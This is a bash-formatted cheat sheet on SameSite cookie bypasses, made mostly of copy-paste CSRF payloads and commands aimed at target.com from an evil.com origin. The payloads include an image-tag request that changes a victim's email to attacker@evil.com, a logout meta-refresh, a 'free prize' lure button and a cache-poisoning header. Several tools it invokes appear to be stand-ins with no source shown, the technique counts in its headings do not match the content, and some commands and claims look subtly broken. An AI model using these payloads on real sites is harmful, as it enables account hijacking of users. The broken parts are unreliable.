#!/bin/bash
# =====================================================
# SAMESITE COOKIE TESTING BIBLE (50+ TECHNIQUES)
# =====================================================
# Comprehensive Guide to Testing SameSite Cookie Protections

### 1. Basic SameSite Detection (10 Methods)
# 1.1 Check Set-Cookie headers
curl -I https://target.com -H "Origin: https://evil.com" | grep -i set-cookie

# 1.2 Browser DevTools check
# Chrome: Application > Cookies > View SameSite column
# Firefox: Storage > Cookies > Filter "sameSite"

# 1.3 Automated detection
python3 samesite-checker.py -u https://target.com -o results.json

### 2. SameSite=Lax Bypasses (15 Techniques)
# 2.1 GET-based CSRF
echo '<img src="https://target.com/change-email?new=attacker@evil.com">' > get_csrf.html

# 2.2 Top-navigation attack
echo '<meta http-equiv="refresh" content="0; url=https://target.com/logout">' > refresh_csrf.html

# 2.3 307 Redirect PoC
curl -v -H "Origin: https://evil.com" -X POST https://target.com/redirect307 -d "url=https://target.com/dangerous-action"

### 3. SameSite=Strict Bypasses (10 Methods)
# 3.1 Time-delayed attack
echo '<script>
setTimeout(() => {
  window.open("https://target.com/sensitive-action", "_blank");
}, 3000);
</script>' > timed_csrf.html

# 3.2 User-triggered opener
echo '<button onclick="window.open('https://target.com/sensitive-action')">
Click for free prize!</button>' > user_triggered.html

### 4. SameSite=None Testing (15 Techniques)
# 4.1 Check insecure context enforcement
curl -k -I https://target.com -H "Origin: http://evil.com" | grep -i set-cookie

# 4.2 Secure flag verification
python3 cookie-checker.py -u https://target.com -c "session=123" --verify-secure-flag

# 4.3 Browser-specific behaviors
# Chrome 80+: Requires Secure flag
# Safari: Known to ignore None in some versions

### 5. Advanced Exploitation (10+ Methods)
# 5.1 DNS Rebinding + SameSite
ruby dns-rebind-samesite.rb --domain target.com --cookie "session=123"

# 5.2 WebSocket SameSite bypass
ws-samesite-bypass --url wss://target.com/ws --cookie "session=123" --command "deleteAccount"

# 5.3 Cache Poisoning + SameSite
curl -X GET "https://target.com/set-preferences?lang=en" -H "X-Forwarded-Host: evil.com"

### 6. Browser-Specific Tests (10 Techniques)
# 6.1 Chrome flag testing
google-chrome --disable-features=SameSiteByDefaultCookies,CookiesWithoutSameSiteMustBeSecure

# 6.2 Safari version detection
curl -A "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15)" https://target.com -I

# 6.3 Firefox configuration check
curl -A "Mozilla/5.0 (X11; Linux x86_64; rv:68.0)" https://target.com -I

### 7. Automated Testing Tools
# 7.1 SameSite Auditor
samesite-audit -u https://target.com -c cookies.txt -o report.html

# 7.2 OWASP ZAP Automation
zap-cli quick-scan -s samesite -r report.md https://target.com

# 7.3 Burp Suite Extension
java -jar -Xmx1024m burpsuite.jar --project-file=samesite-test.burp

### 8. Defense Verification (10 Methods)
# 8.1 Cookie Prefix Check
curl -I https://target.com | grep -i "__secure-" || grep -i "__host-"

# 8.2 Multiple SameSite Policies
python3 cookie-conflict.py -u https://target.com/login -v

# 8.3 Cross-Origin Isolation Test
curl -H "Origin: https://evil.com" -I https://target.com/api | grep -i "cross-origin"

### Pro Tips
1. **Chrome Logs**: chrome://flags/#same-site-by-default-cookies
2. **Error Monitoring**: Check browser console for cookie warnings
3. **Time-based Attacks**: Works against Strict when user has multiple tabs open
4. **Mobile Browsers**: Test on iOS Safari/Android Chrome for different behaviors
5. **Version Detection**: Safari < 12.1 ignores SameSite=None

### Sample Workflow
# 1. Detect cookies
curl -I https://target.com | grep -i set-cookie > cookies.txt

# 2. Test each cookie
while read -r cookie; do
  python3 samesite-tester.py -u https://target.com -c "$cookie" -o results/
done < cookies.txt

# 3. Verify browser behaviors
browser-samesite-test --url https://target.com --browsers chrome,firefox,safari

# This cheat sheet covers:
# - All SameSite policies (Strict/Lax/None)
# - Browser-specific behaviors
# - Advanced exploitation techniques
# - Automated testing tools
# - Defense verification methods
# - Copy-paste ready for immediate use in security assessments. Test responsibly!
